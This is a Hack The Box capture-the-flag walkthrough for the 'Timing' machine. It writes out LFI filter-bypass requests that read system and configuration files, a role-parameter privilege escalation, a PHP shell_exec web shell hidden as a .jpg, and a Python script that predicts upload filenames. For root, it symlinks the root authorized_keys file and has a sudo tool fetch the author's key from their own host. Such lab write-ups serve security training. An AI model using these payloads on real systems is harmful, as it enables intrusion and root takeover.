---
title: "Hack The Box - Timing Walkthrough"
date: 2022-06-04T19:00:00+02:00
description: "Hack The Box Timing Walkthrough/Write-Up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/timing_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/timing_htb.png"
shareImage: "/images/timing_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Today we will be taking a look at Timing from Hack the Box. Timing is considered to be of medium difficulty, and requires the usage of a local file inclusion to eventually find credentials for the box. We then find an application that we can run with sudo permissions, and misuse it to gain root access.

## Foothold
Let's start off by initiating an nmap scan, which will enumerate all services and their versions that are running on the machine. To ensure we aren't missing any critical information, I chose to specify the -p- flag to scan all ports as well.

```sh
nmap -sC -sV -p- -oA nmap/all_ports timing.htb
```

The nmap scan came back with the following results.

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find SSH open on port 22, and an Apache httpd version webserver with version 2.4.29 on port 80. Let's visit the webserver to see what we are dealing with. As the nmap scan already mentioned, we are automatically redirected to the /login.php login form. Before we start working with the login form, I always like to run enumeration tools in the background. Let's run gobuster. As we see login.php, I add the -x php flag to check for php files.

```sh
gobuster dir -u http://timing.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out -x php
```

Let's start up BurpSuite, and analyze the login form. We login with admin:admin credentials, and send the following POST request.

```HTTP
POST /login.php?login=true HTTP/1.1
Host: timing.htb
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://timing.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://timing.htb/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kgeait309cbhvqc7983bstr7vc
Connection: close

user=admin&password=admin
```

Let's save the request and see if SQLMap manages to find an SQL vulnerability within this form.

```sh
sqlmap -r req --level=5 --risk=3
```

SQLMap does not find any injectable parameters. Let's take a look at the gobuster results. 

```text
/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]
/login.php            (Status: 200) [Size: 5609]
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
/image.php            (Status: 200) [Size: 0]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
/footer.php           (Status: 200) [Size: 3937]
/server-status        (Status: 403) [Size: 275]
/db_conn.php          (Status: 200) [Size: 0]
```

It seems like we are able to enumerate existing pages, as we get redirects from logout.php, upload.php, profile.php etc. However, we cannot browse to these pages before we get access to the portal. We can however browse to image.php, which gives us a blank page. Let's figure out whether image.php has any functions that we can leverage. To figure this out we will be using wfuzz. 

```sh
wfuzz -c -u http://timing.htb/image.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0
```

We use -c to add colors, and add an LFI payload to the parameter option to test for local file inclusion. We get a 200 response code for every page, so we hide false-positives when the char count is 0. We get the following result:

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000360:   200        0 L      3 W        25 Ch       "img"
```

We navigate to the page using an LFI payload. 

```http
GET /image.php?img=../../../../../../etc/passwd HTTP/1.1
```

And get the following output.

```HTTP
HTTP/1.1 200 OK

Hacking attempt detected!
```

Let's send this request to the Burp repeater, and see if we can bypass the security that is in place. PHP has a base64 filter that we can use for this purpose. Let's craft the following payload and send it to the server.

```http
GET /image.php?img=php://filter/convert.base64-decoder/resource=../../../../../etc/passwd HTTP/1.1
```

The server still thinks we are sending a malicous request. After doing some tests I figured out that the server doesn't like the dots in the request, so I send the following one.

```http
GET /image.php?img=php://filter/convert.base64-decoder/resource=/etc/passwd HTTP/1.1
```

After which the server responds with the contents of the /etc/passwd file. 

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

We see that there is a user on the box named aaron. Whenever I know a username on a box and have a local file inclusion, I always try to read the SSH private key of that user. Let's send the following request.

```http
GET /image.php?img=php://filter/convert.base64-decoder/resource=/home/aaron/.ssh/id_rsa HTTP/1.1
```

But sadly, no luck. When we were running the gobuster scan earlier I stumbled onto a /db_conn.php file. This file seems interesting, as it could contain information regarding the underlying database. Let's try to get the contents of that file in a base64 encoded form. 

```http
GET /image.php?img=php://filter/convert.base64-encode/resource=db_conn.php HTTP/1.1
```

Which, when we decode it back from base64, shows us the following contents.

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_xxxxx_p422w0rd');
```

We find the credentials for the local mysql database. I tried to use them to get past the login form, but unfortunately there is no password reuse in play. Let's continue with the next file that we found using gobuster, which is upload.php.

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

We can see that this php file provides us with the ability to upload files to the server. We however still need to be authenticated in order to use this. In the top statement there's an include statement, including the admin_auth_check.php file. Let's see look at this file.

```http
GET /image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php HTTP/1.1
```

After decoding the contents back from base64 we get the following php code.

```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?>
```

This file checks whether the session role is equal to 1. If this is not the case, we will get a permission denied. It seems asif we really have to authenticate to the webapp in order to get onto this box. At this point I was feeling pretty stuck, so after looking at a few hints I realized that the credentials for the web app were as simple as aaron:aaron... This was a bit triggering but alright, let's continue! :) 

We get logged onto the web app as "user 2".  In order to upload files, we need our user's role to be equal to 1. Our user pretty much only has one function, which is "edit profile". Let's edit our profile and check the request. 

```http
POST /profile_update.php HTTP/1.1
Host: timing.htb
Content-Length: 52
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://timing.htb
Referer: http://timing.htb/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kgeait309cbhvqc7983bstr7vc
Connection: close

firstName=test&lastName=test&email=test&company=test
```

Let's see if we can change our role by supplying &role=1 to the request.

```http
POST /profile_update.php HTTP/1.1
[...]

firstName=test&lastName=test&email=test&company=test&role=1
```

We forward the request, and out of nowhere the "admin panel" view pops up to our account. Nice. This admin panel allows us to upload an avatar image. Visiting this page directs us to the avatar_uploader.php file, which used the upload.php file to upload contents. After analyzing the upload.php file, we notice that we are not allowed to upload .jpg files, and that the file name is changed to the md5 hash of the file in combination with the output of the php time() command. Let's step-by-step exploit this file upload functionality. 

Let's first create a simple php command shell, and save it as shell.jpg.

```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

Now we need to create a script that will get the name for the file that we are uploading. For this I create a simple Python script. 

```python
import time  
import hashlib

while True:  
    print(f"hash = {hashlib.md5('$file_hash'.encode() + str(int(time.time())).encode()).hexdigest()}")  
    
    time.sleep(1)
```

We try the the hashes created by the python script in combination with the filename, and eventually find the following request that works.

```http
GET /image.php?img=images/uploads/0d6e548d7312cda8654014a8f17316f0_shell.jpg&cmd=whoami HTTP/1.1
```

Which responds with.

```txt
www-data
```

We have achieved code execution! Let's quickly get a reverse shell onto this box before the file gets deleted! I try to get a reverse shell using netcat and a typical bash reverse shell on different ports, but sadly, no luck. Seems like there is a firewall in place that is blocking connections. 

Let's manually enumerate the box using our command shell. After looking through all of the /var/www/html/ files, user directories, back up directories and more, I finally stumble upon a source-files-backup.zip within the /opt/ directory. In order to download it, we need to move it to a location that is accessible for us, such as the /var/www/html/ directory. 

```http
GET /image.php?img=images/uploads/0d6e548d7312cda8654014a8f17316f0_shell.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/ HTTP/1.1
```

We can now navigate to http://timing.htb/source-files-backup.zip to download the file. We unzip the file, and find the following contents.

```text
-rw-r--r-- 1 kali kali  200 Jul 21  2021 admin_auth_check.php
-rw-r--r-- 1 kali kali  373 Jul 21  2021 auth_check.php
-rw-r--r-- 1 kali kali 1.3K Jul 21  2021 avatar_uploader.php
drwxr-xr-x 2 kali kali 4.0K Jul 21  2021 css
-rw-r--r-- 1 kali kali   92 Jul 21  2021 db_conn.php
-rw-r--r-- 1 kali kali 3.9K Jul 21  2021 footer.php
drwxr-xr-x 8 kali kali 4.0K Jul 21  2021 .git
-rw-r--r-- 1 kali kali 1.5K Jul 21  2021 header.php
-rw-r--r-- 1 kali kali  507 Jul 21  2021 image.php
drwxr-xr-x 3 kali kali 4.0K Jul 21  2021 images
-rw-r--r-- 1 kali kali  188 Jul 21  2021 index.php
drwxr-xr-x 2 kali kali 4.0K Jul 21  2021 js
-rw-r--r-- 1 kali kali 2.1K Jul 21  2021 login.php
-rw-r--r-- 1 kali kali  113 Jul 21  2021 logout.php
-rw-r--r-- 1 kali kali 3.0K Jul 21  2021 profile.php
-rw-r--r-- 1 kali kali 1.7K Jul 21  2021 profile_update.php
-rw-r--r-- 1 kali kali  984 Jul 21  2021 upload.php
```

We find a .git directory. Let's use gittools to extract the information from this git repo. We issue the following command.

```sh
/opt/tools/GitTools/Extractor/extractor.sh backup gittools_out
```

When navigating through our dumped files, we stumble across a commit that changed the password within the db_conn.php file. Let's give it another shot, and try to use this password to connect to ssh. And finally, we get our user shell.

```sh
aaron@timing:~$ whoami
>> aaron

aaron@timing:~$ ls 
>>user.txt
```

## Privilege escalation
Let's run Linpeas and hope that the privilege escalation of this box is less of a hell than the initial access :D Linpeas notices that our user is allowed to run /usr/bin/netutils as root. Let's run sudo -l. 

```text
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

When looking at the file that is being ran, we can see the following contents.

```sh
aaron@timing:~$ cat /usr/bin/netutils

#! /bin/bash
java -jar /root/netutils.jar
```

When running the executable as sudo, we see that we are allowed to specify a URL to which the server will connect. The file that we specify is then saved onto Aaron's home directory.

```text
aaron@timing:~$ sudo /usr/bin/netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.29/file.txt
Initializing download: http://10.10.14.29/file.txt
File size: 563 bytes
Opening output file keys
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 10 byte in 0 seconds. (5.49 KB/s)
```

Given this knowledge, we can create a symbolic link of the root ssh authorized_keys file, and then have root overwrite its own authorized_keys file with our public key. Let's first create the symbolic link.

```sh
aaron@timing:~$ ln -s /root/.ssh/authorized_keys pub_keys
```

Now we create a new SSH key pair, and copy the id_rsa.pub file to pub_keys. We set up a Python webserver, and tell netutils to download the pub_keys file.

```text
aaron@timing:~$ sudo /usr/bin/netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.29/pub_keys
Initializing download: http://10.10.14.29/pub_keys
File size: 563 bytes
Opening output file keys
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 563 byte in 0 seconds. (5.49 KB/s)
```

We can see that the file is downloaded in the web server logs.

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                                                                                                                                                                   
10.129.128.235 - - [04/Apr/2022 18:01:13] "GET /keys HTTP/1.0" 200 -                                                                                                                                                                       
10.129.128.235 - - [04/Apr/2022 18:01:13] "GET /keys HTTP/1.0" 200 -
```

Now we can finally logon to the server as root, using the basic ssh syntax.

```sh
kali@kali:~$ ssh root@timing.htb
```

And we are root!

```sh
root@timing:~# whoami                                     
root                                                      
root@timing:~# ls                                         
axel  netutils.jar  root.txt
```

I hope this walkthrough has been useful to you. It sure has been a frustrating but educational experience for me! Thanks for reading, and have a nice day :) 